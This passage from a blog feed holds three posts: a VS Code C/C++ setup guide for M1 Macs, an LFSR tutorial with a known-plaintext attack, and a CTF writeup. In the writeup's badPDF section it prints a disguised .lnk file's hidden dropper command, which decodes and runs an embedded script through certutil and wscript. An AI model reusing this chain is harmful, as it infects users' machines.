        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="M1-Mac-OS-编写C-C"><a href="#M1-Mac-OS-编写C-C" class="headerlink" title="M1 Mac OS 编写C/C++"></a>M1 Mac OS 编写C/C++</h1><h2 id="安装并配置"><a href="#安装并配置" class="headerlink" title="安装并配置"></a>安装并配置</h2><h3 id="VS-code"><a href="#VS-code" class="headerlink" title="VS code"></a>VS code</h3><blockquote><p>Visual Studio Code（简称“VS Code” ）是Microsoft在2015年4月30日Build开发者大会上正式宣布一个运行于 Mac OS 、Windows和 Linux之上的，针对于编写现代Web和云应用的跨平台源代码编辑器。</p></blockquote><p><strong>本机配置</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220211225202249.png" alt="电脑配置"></p><h4 id="为了运行"><a href="#为了运行" class="headerlink" title="为了运行"></a>为了运行</h4><ul><li><p>进入<a href="https://code.visualstudio.com">官网</a>，下载</p><p>Universal版本同时适用于Intel芯片 与 苹果芯片（M1）的电脑</p></li></ul><p><img src="https://raw.githubusercontent.com/Harry0597/Imag/master/uPic/image-20220211210633145.png" alt="VS code下载"></p><ul><li><p><strong>汉化插件</strong>（自动弹出，点击下载即可）</p></li><li><p>其他插件（如下图，搜索下载）</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220211220821204.png" alt="其他插件下载"></p><ul><li><p><strong>C/C++</strong></p></li><li><p><strong>Code Runner</strong></p></li><li><p><strong>CodeLLDB</strong></p><p>下载完成后，点击其右下角小齿轮进行设置</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220211221406411.png" alt="CodeLLDB设置"></p><ul><li>勾选<strong>Code-runner: Clear Previous Output</strong></li><li>勾选<strong>Code-runner: Ignore Selection</strong></li><li><strong>取消</strong>勾选<strong>Code-runner: Preserve Focus</strong></li><li>勾选<strong>Code-runner: Run In Terminal</strong></li><li>勾选<strong>Code-runner: Save All Files Before Run</strong></li><li>勾选<strong>Code-runner: Save File Before Run</strong></li></ul></li></ul></li><li><p>创建 纯英文 文件夹（专门放与C相关的）</p></li><li><p>打开该文件夹 &amp; 信任该文件夹 </p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220211223203198.png" alt="打开文件夹"></p></li><li><p>新建 hello.c 文件</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220211223420437.png" alt="新建.c文件"></p></li><li><p>设置代码自动保存</p><ul><li>点开对应设置</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220211223618916.png" alt="设置"></p><ul><li><p>改为afterDelay</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220211223808251.png" alt="设置自动保存"></p></li></ul></li><li><p>测试运行</p><ul><li><p>hello.c中输入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello,world!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>点击右上角箭头来运行</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220211224230210.png" alt="运行"></p></li><li><p>如图，则运行环节完成</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220211224347680.png" alt="效果图"></p></li></ul></li></ul><h4 id="为了调试"><a href="#为了调试" class="headerlink" title="为了调试"></a>为了调试</h4><ul><li><p>对<strong>hello.c</strong>打开调试界面（或直接按下图左边的齿轮),打开launch.json</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220212002035435.png" alt="调试界面"></p></li><li><p>改launch.json如下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;2.0.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;tasks&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;label&quot;</span>: <span class="string">&quot;build main&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;shell&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;clang++&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;args&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;main.cpp&quot;</span>,</span><br><span class="line">                <span class="string">&quot;-o&quot;</span>,</span><br><span class="line">                <span class="string">&quot;a.out&quot;</span>,</span><br><span class="line">                <span class="string">&quot;-g&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">&quot;group&quot;</span>: &#123;</span><br><span class="line">                <span class="attr">&quot;kind&quot;</span>: <span class="string">&quot;build&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;isDefault&quot;</span>: <span class="literal">true</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;shell&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;label&quot;</span>: <span class="string">&quot;C/C++: clang build active file&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;/usr/bin/clang&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;args&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;-g&quot;</span>,</span><br><span class="line">                <span class="string">&quot;$&#123;file&#125;&quot;</span>,</span><br><span class="line">                <span class="string">&quot;-o&quot;</span>,</span><br><span class="line">                <span class="string">&quot;$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">&quot;options&quot;</span>: &#123;</span><br><span class="line">                <span class="attr">&quot;cwd&quot;</span>: <span class="string">&quot;$&#123;workspaceFolder&#125;&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">&quot;problemMatcher&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;$gcc&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">&quot;group&quot;</span>: &#123;</span><br><span class="line">                <span class="attr">&quot;kind&quot;</span>: <span class="string">&quot;build&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;isDefault&quot;</span>: <span class="literal">true</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;cppbuild&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;label&quot;</span>: <span class="string">&quot;C/C++: gcc 生成活动文件&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;/usr/bin/gcc&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;args&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;-fdiagnostics-color=always&quot;</span>,</span><br><span class="line">                <span class="string">&quot;-g&quot;</span>,</span><br><span class="line">                <span class="string">&quot;$&#123;file&#125;&quot;</span>,</span><br><span class="line">                <span class="string">&quot;-o&quot;</span>,</span><br><span class="line">                <span class="string">&quot;$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">&quot;options&quot;</span>: &#123;</span><br><span class="line">                <span class="attr">&quot;cwd&quot;</span>: <span class="string">&quot;$&#123;fileDirname&#125;&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">&quot;problemMatcher&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;$gcc&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">&quot;group&quot;</span>: <span class="string">&quot;build&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;detail&quot;</span>: <span class="string">&quot;编译器: /usr/bin/gcc&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>改tasks.json如下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;2.0.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;tasks&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;label&quot;</span>: <span class="string">&quot;build main&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;shell&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;clang++&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;args&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;main.cpp&quot;</span>,</span><br><span class="line">                <span class="string">&quot;-o&quot;</span>,</span><br><span class="line">                <span class="string">&quot;a.out&quot;</span>,</span><br><span class="line">                <span class="string">&quot;-g&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">&quot;group&quot;</span>: &#123;</span><br><span class="line">                <span class="attr">&quot;kind&quot;</span>: <span class="string">&quot;build&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;isDefault&quot;</span>: <span class="literal">true</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;shell&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;label&quot;</span>: <span class="string">&quot;C/C++: clang build active file&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;/usr/bin/clang&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;args&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;-g&quot;</span>,</span><br><span class="line">                <span class="string">&quot;$&#123;file&#125;&quot;</span>,</span><br><span class="line">                <span class="string">&quot;-o&quot;</span>,</span><br><span class="line">                <span class="string">&quot;$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">&quot;options&quot;</span>: &#123;</span><br><span class="line">                <span class="attr">&quot;cwd&quot;</span>: <span class="string">&quot;$&#123;workspaceFolder&#125;&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">&quot;problemMatcher&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;$gcc&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">&quot;group&quot;</span>: &#123;</span><br><span class="line">                <span class="attr">&quot;kind&quot;</span>: <span class="string">&quot;build&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;isDefault&quot;</span>: <span class="literal">true</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;cppbuild&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;label&quot;</span>: <span class="string">&quot;C/C++: gcc 生成活动文件&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;/usr/bin/gcc&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;args&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;-fdiagnostics-color=always&quot;</span>,</span><br><span class="line">                <span class="string">&quot;-g&quot;</span>,</span><br><span class="line">                <span class="string">&quot;$&#123;file&#125;&quot;</span>,</span><br><span class="line">                <span class="string">&quot;-o&quot;</span>,</span><br><span class="line">                <span class="string">&quot;$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">&quot;options&quot;</span>: &#123;</span><br><span class="line">                <span class="attr">&quot;cwd&quot;</span>: <span class="string">&quot;$&#123;fileDirname&#125;&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">&quot;problemMatcher&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;$gcc&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">&quot;group&quot;</span>: <span class="string">&quot;build&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;detail&quot;</span>: <span class="string">&quot;编译器: /usr/bin/gcc&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220212002608432.png" alt="tasks.json在这里"></p></li><li><p>断点，对<strong>hello.c</strong>调试一下</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220212002833586.png" alt="断点调试"></p><p>如图，成功执行并断开则为成功。</p></li></ul><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://www.bilibili.com/video/BV1U741157Rd/?spm_id_from=333.788.recommend_more_video.0">Mac用Visual Studio Code编写C/C++ </a></li></ul><p>（完）</p>]]></content>
      
      
      
        <tags>
            
            <tag> Mac OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Crypto · LFSR初探</title>
      <link href="/2022/01/30/LFSR%E5%88%9D%E6%8E%A2/"/>
      <url>/2022/01/30/LFSR%E5%88%9D%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="LFSR"><a href="#LFSR" class="headerlink" title="LFSR"></a>LFSR</h1><blockquote><p>即<strong>线性反馈移位寄存器</strong>，一个LFSR由若干个<strong>时钟存储元件（触发器）</strong>和一个<strong>反馈路径</strong>组成。</p></blockquote><p><strong>几个概念</strong></p><ul><li><p>LFSR作用</p><p>产生长伪随机序列，通常为<strong>二进制</strong></p></li><li><p>存储元件（触发器）</p><p>存储数据的一个概念，知道可以<strong>存数据</strong>即可。</p></li><li><p>反馈路径</p><p>计算移位寄存器中某些触发器的<strong>XOR和</strong>，并将其传递。</p></li><li><p>度</p><p>LFSR由若干时钟存储元件（触发器）组成，而<strong>存储元件的个数</strong>就是LFSR的度。</p></li></ul><h2 id="简单LFSR"><a href="#简单LFSR" class="headerlink" title="简单LFSR"></a>简单LFSR</h2><p> 考虑<strong>度m=3</strong>、拥有三个触发器的FF2、FF1和FF0，且反馈路径如下</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220130095350383.png" alt="image-20220130095350383"></p><p>让我们来看看它究竟是如何运作的，又有什么性质。</p><ol><li><p>假设初始状态为：S2=1, S1=0, S0=0 ；<strong>最右位</strong>的FF0往外<strong>输出</strong></p></li><li><p>在每一个时间单位下，内部状态位<strong>向右移动</strong>一位</p><p>从左往右看</p><ul><li>原先S2的值（1）给到 FF1</li><li>原先S1的值（0）给到 FF0</li><li>原先S0的值（0）和 原先S1的值（0）异或后（得到0）给到 FF2</li><li>原先S0的值（0）输出，LFSR得到数据 0</li></ul></li><li><p>多次移位后，得到数据</p><table><thead><tr><th>Clk</th><th>FF2</th><th>FF1</th><th>FF0=si</th></tr></thead><tbody><tr><td>0</td><td>1</td><td>0</td><td>0</td></tr><tr><td>1</td><td>0</td><td>1</td><td>0</td></tr><tr><td>2</td><td>1</td><td>0</td><td>1</td></tr><tr><td>3</td><td>1</td><td>1</td><td>0</td></tr><tr><td>4</td><td>1</td><td>1</td><td>1</td></tr><tr><td>5</td><td>0</td><td>1</td><td>1</td></tr><tr><td>6</td><td>0</td><td>0</td><td>1</td></tr><tr><td>7</td><td>1</td><td>0</td><td>0</td></tr><tr><td>8</td><td>0</td><td>1</td><td>0</td></tr></tbody></table></li></ol><p>可见，LFSR从第6个时间周期后开始重复，这意味此LFSR周期长度为7</p><p>接下来，我们试着用一个简单的公式来描述此过程。</p><p>$$ S3 ≡ S1 + S0 \mod 2$$</p><p>$$ S4 ≡ S2 + S1 \mod 2$$</p><p>$$ S5 ≡ S3 + S2 \mod 2$$</p><p>$$ …$$</p><p>其中 Si 就是第i次输出的数据，<strong>i从0开始</strong></p><p>而这里的S3其实就是第2步中FF2获得的值，右移了几次所输出的</p><p>不难归纳出输出位的计算公式为：</p><p>$$ S_{i+3} ≡ S_{i+1} + S_i \mod 2$$</p><p>其中，i = 0, 1, 2…</p><blockquote><p>通过以上这个简单例子，我们便知晓了LFSR的<strong>大致流程</strong>与<strong>具有周期</strong>这个性质。</p></blockquote><p>接下来，向现实迈进！</p><h2 id="LFSR通用形式"><a href="#LFSR通用形式" class="headerlink" title="LFSR通用形式"></a>LFSR通用形式</h2><p>考虑一个度为m的LFSR通用形式。</p><p>还得再提一个概念</p><ul><li><p>反馈系数</p><p>某条反馈路径是否活跃取决于反馈系数P0, P1, …, Pm-1</p><ul><li>若Pi = 1，此反馈是活跃的</li><li>若Pi = 0，对应触发器的输出将不会被反馈</li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220130095532809.png" alt="image-20220130095532809"></p><p>反馈系数很好理解。</p><p>在简单LFSR只异或、移位的基础上，多乘一个系数P罢了。</p><p>例如，对于 Sm-1  在一个周期内</p><ol><li>它的值给到下一个触发器</li><li>还有条支路，导致 Sm-1 需要去乘 Pm-1，再异或</li></ol><p>此时可见，若Pm-1 = 0，乘后得到的结果就是0，0再去与其他值异或，对异或的结果不造成影响。</p><p><strong>接下来我们再对其具体性质进行剖析。</strong></p><p>假设这个LFSR初始加载的值为S0, …, Sm-1, 则LFSR的<strong>下一个输出位Sm</strong>，可表示为：</p><p>$$S_m ≡ S_{m-1}P_{m-1} +···+ S_1P_1 + S_0P_0 \mod 2$$</p><p>再下一个输出位：</p><p>$$S_{m+1} ≡ S_{m}P_{m-1} +···+ S_2P_1 + S_1P_0 \mod 2$$</p><p>归纳，可得：</p><p>$$S_{i+m} ≡ \sum_{j=0}^{m-1} P_{j}·S_{i+j} \mod 2; S_i, P_j∈{0, 1}; i = 0, 1, 2, …$$</p><blockquote><p>为什么下一位输出是Sm，可以试着理解下</p></blockquote><p>接下来介绍的概念，虽未见其作用，但终究决定拓展开来。</p><p>在<strong>简单LFSR</strong>的例子中，我们知道了<strong>周期性</strong></p><p><strong>问：度为m的LFSR可以产生 最大的 不重复序列长度是多少？</strong></p><p>答案是显而易见的</p><blockquote><p>度为m的LFSR可以产生的最大序列长度为$ 2^m-1 $ </p></blockquote><p>一言以蔽之</p><ul><li><p>LFSR的输出由m个内部寄存器状态唯一确定</p></li><li><p>给定某个状态，也能确定下一个状态</p></li></ul><p>所以，只要LFSR 回到 从前有过的任何一个状态，它将立即开始重复。</p><p>因此，问<strong>最大序列长度</strong> 就是 问<strong>最小正周期</strong> 也相当于 问<strong>m个寄存器能有多少个非零状态</strong>，自然是$ 2^m-1 $</p><p>注：<strong>必须排除所有为零的状态。</strong>若某LFSR状态为全零，输出值将一直为0，谈周期性没意义。</p><h3 id="本原多项式"><a href="#本原多项式" class="headerlink" title="本原多项式"></a>本原多项式</h3><p>LFSR还可以用<strong>多项式表达</strong>：</p><p>$$ P(x)=x^m+P_{m-1}x^{m-1}+…+P_1x+P_0 $$</p><p>最大长度LFSR（周期为$ 2^m-1 $）拥有所谓的<strong>本原多项式</strong></p><blockquote><p>本原多项式是一种特殊的<strong>不可约分多项式</strong>，因子除了1就是多项式本身，此特性便利计算。</p></blockquote><p>而对于同一个度m，可能存在多个本原多项式。</p><p>可见表格，其中（0, 1, 2）表示$1+ x + x^2$ ; (0, 2, 5)表示$ 1 + x^2 + x^5 $</p><p>那么，再对照多项式表达，便可知道对应反馈系数P的取值。</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220130095639887.png" alt="image-20220130095639887"></p><h3 id="LFSR-·-已知明文攻击"><a href="#LFSR-·-已知明文攻击" class="headerlink" title="LFSR · 已知明文攻击"></a>LFSR · 已知明文攻击</h3><p>如果将LFSR当作序列密码使用，密钥K就是反馈系数向量（Pm-1, …, P1, P0）</p><p>若知道某些明文与对应的密文，便可发起攻击。</p><p>这里假设已经知道度m（不知道的话，可以一个个值爆破出来</p><p><strong>理一下已知参数</strong></p><ul><li><p>度： m</p></li><li><p>已知明文： x0, x1, …, x2m-1</p></li><li><p>对应密文： y0, y1, …, y2m-1</p></li></ul><p><strong>第一步，异或得到2m个密钥序列位</strong></p><p>$$ S_i ≡ x_i + y_i \mod 2; i=0, 1, …, 2m-1 $$</p><p><strong>第二步，找出反馈系数Pi（密钥）</strong></p><p>依据先前讨论，有 S 与 P 关系如下：</p><p>$$S_{i+m} ≡ \sum_{j=0}^{m-1} P_{j}·S_{i+j} \mod 2; S_i, P_j∈{0, 1}; i = 0, 1, 2, …$$</p><p>所以，得到：</p><p>$$ i=0, S_m ≡ P_{m-1}S_{m-1}+…+P_1S_1+P_0S_0 \mod 2$$</p><p>$$ i=0, S_{m+1} ≡ P_{m-1}S_{m}+…+P_1S_2+P_0S_1 \mod 2$$</p><p>$$ … $$</p><p>$$ i=m-1, S_{2m-1} ≡ P_{m-1}S_{2m-2}+…+P_1S_m+P_0S_{m-1} \mod 2$$</p><p>现在，咱有了m个未知数（P0, P1, …, Pm-1）的m个线性等式</p><p>可利用高斯消去、矩阵求逆等方法来解此线性等式系统</p><p><strong>思路通而题可做矣</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022华为HWS选拔赛WP</title>
      <link href="/2022/01/24/2022%E5%8D%8E%E4%B8%BAHWS%E9%80%89%E6%8B%94%E8%B5%9BWP/"/>
      <url>/2022/01/24/2022%E5%8D%8E%E4%B8%BAHWS%E9%80%89%E6%8B%94%E8%B5%9BWP/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="2022华为HWS选拔赛WP"><a href="#2022华为HWS选拔赛WP" class="headerlink" title="2022华为HWS选拔赛WP"></a>2022华为HWS选拔赛WP</h1><h2 id="1-个人信息"><a href="#1-个人信息" class="headerlink" title="1. 个人信息"></a>1. 个人信息</h2><p>名称：Hakkar0597</p><p>排名：104</p><h2 id="2-解题情况"><a href="#2-解题情况" class="headerlink" title="2. 解题情况"></a>2. 解题情况</h2><p>一道Misc，总三道</p><p>两道Crypto，总三道</p><p><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mcVfwBprH1UhtYUERICYZnDCJgOeLZHvesUKE3j3Pm11afJcOfNvKG92javayqZncLID56icLQyBlNkNb.1*cy.o!/b&bo=AAKsAQAAAAADJ60!&rf=viewer_4" alt="答题情况"></p><h2 id="3-具体WP"><a href="#3-具体WP" class="headerlink" title="3. 具体WP"></a>3. 具体WP</h2><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a><strong>MISC</strong></h3><h4 id="题目一名称：badPDF"><a href="#题目一名称：badPDF" class="headerlink" title="题目一名称：badPDF"></a>题目一名称：badPDF</h4><p>不会。</p><p>找到了网上的PDF有关题解，发现2020年华为HWS选拔赛曾出过。</p><p>细看是原题复现（一点没变）。<br><a href="https://zyazhb.github.io/2020/08/16/ctf-hws/#fakepdf">ZYA’s Writeup</a>关于此题讲解的透彻，只差最后对VBScript语言的调试。</p><p>因为Mac端没找到合适的，最后选择了粗略学习此语言后，用Python</p><h5 id="步骤一"><a href="#步骤一" class="headerlink" title="步骤一"></a>步骤一</h5><p>Cat 这个lnk文件，发现命令。</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="symbol">\R</span>1dP?YWindows??:?dP?Y*WindowsV1dP?ZSystem32??:?dP?Z*?System32R2?t=!b cmd.exe??F??F?*uxcmd.exeJ-Ip??C:<span class="symbol">\W</span>indows<span class="symbol">\S</span>ystem32<span class="symbol">\c</span>md.exe!..<span class="symbol">\.</span>.<span class="symbol">\.</span>.</span><br><span class="line"></span><br><span class="line"><span class="symbol">\W</span>indows<span class="symbol">\S</span>ystem32<span class="symbol">\c</span>md.exe?/c copy &quot;20200308-sitrep-48-covid-19.pdf.lnk&quot; <span class="variable">%tmp%</span><span class="symbol">\\</span>g4ZokyumBB2gDn.tmp /y&amp;for /r C:<span class="symbol">\\</span>Windows<span class="symbol">\\</span>System32<span class="symbol">\\</span> <span class="variable">%i in (*ertu*.exe) do copy %</span>i <span class="variable">%tmp%</span><span class="symbol">\\</span>msoia.exe /y&amp;findstr.exe &quot;TVNDRgAAAA&quot; <span class="variable">%tmp%</span><span class="symbol">\\</span>g4ZokyumBB2gDn.tmp&gt;<span class="variable">%tmp%</span><span class="symbol">\\</span>cSi1r0uywDNvDu.tmp&amp;<span class="variable">%tmp%</span><span class="symbol">\\</span>msoia.exe -decode <span class="variable">%tmp%</span><span class="symbol">\\</span>cSi1r0uywDNvDu.tmp <span class="variable">%tmp%</span><span class="symbol">\\</span>oGhPGUDC03tURV.tmp&amp;expand <span class="variable">%tmp%</span><span class="symbol">\\</span>oGhPGUDC03tURV.tmp -F:* <span class="variable">%tmp%</span> &amp;wscript <span class="variable">%tmp%</span><span class="symbol">\\</span>9sOXN6Ltf0afe7.js.pdf?<span class="variable">%SystemRoot%</span><span class="symbol">\s</span>ystem32<span class="symbol">\c</span>md.exe<span class="variable">%SystemRoot%</span><span class="symbol">\s</span>ystem32<span class="symbol">\c</span>md.exe?<span class="variable">%?</span></span><br></pre></td></tr></table></figure><h5 id="步骤二"><a href="#步骤二" class="headerlink" title="步骤二"></a>步骤二</h5><p>%tmp%目录中 发现了过程</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">findstr.exe <span class="string">&quot;TVNDRgAAAA&quot;</span> g4ZokyumBB2gDn.tmp &gt;<span class="number">00hululu</span></span><br><span class="line"></span><br><span class="line">.<span class="string">\msoia.exe</span> -decode .<span class="string">\00hululu</span> <span class="number">11hahaha</span></span><br><span class="line"></span><br><span class="line">expand .<span class="string">\11hahaha</span> -F:* ./</span><br></pre></td></tr></table></figure><h5 